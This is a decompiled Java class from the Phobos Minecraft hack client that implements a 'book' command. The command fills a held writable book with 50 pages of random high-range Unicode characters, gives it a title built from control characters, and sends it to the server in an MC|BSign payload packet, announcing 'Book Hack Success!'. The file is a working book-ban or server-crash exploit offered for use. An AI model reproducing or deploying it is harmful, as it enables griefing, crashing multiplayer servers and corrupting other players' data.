
/*
 * Decompiled with CFR 0.151.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  net.minecraft.init.Items
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.PacketBuffer
 *  net.minecraft.network.play.client.CPacketCustomPayload
 */
package me.earth.phobos.features.command.commands;

import io.netty.buffer.Unpooled;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import me.earth.phobos.Phobos;
import me.earth.phobos.features.command.Command;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class BookCommand
extends Command {
    public BookCommand() {
        super("book", new String[0]);
    }

    @Override
    public void execute(String[] commands) {
        ItemStack heldItem = BookCommand.mc.player.getHeldItemMainhand();
        if (heldItem.getItem() == Items.WRITABLE_BOOK) {
            Random rand = new Random();
            IntStream characterGenerator = rand.ints(128, 1112063).map(i -> i < 55296 ? i : i + 2048);
            String joinedPages = characterGenerator.limit(10500L).mapToObj(i -> String.valueOf((char)i)).collect(Collectors.joining());
            NBTTagList pages = new NBTTagList();
            for (int page2 = 0; page2 < 50; ++page2) {
                pages.appendTag((NBTBase)new NBTTagString(joinedPages.substring(page2 * 210, (page2 + 1) * 210)));
            }
            if (heldItem.hasTagCompound()) {
                assert (heldItem.getTagCompound() != null);
                heldItem.getTagCompound().setTag("pages", (NBTBase)pages);
            } else {
                heldItem.setTagInfo("pages", (NBTBase)pages);
            }
            StringBuilder stackName = new StringBuilder();
            for (int i2 = 0; i2 < 16; ++i2) {
                stackName.append("\u0014\f");
            }
            heldItem.setTagInfo("author", (NBTBase)new NBTTagString(BookCommand.mc.player.getName()));
            heldItem.setTagInfo("title", (NBTBase)new NBTTagString(stackName.toString()));
            PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
            buf.writeItemStack(heldItem);
            BookCommand.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", buf));
            BookCommand.sendMessage(Phobos.commandManager.getPrefix() + "Book Hack Success!");
        } else {
            BookCommand.sendMessage(Phobos.commandManager.getPrefix() + "b1g 3rr0r!");
        }
    }
}

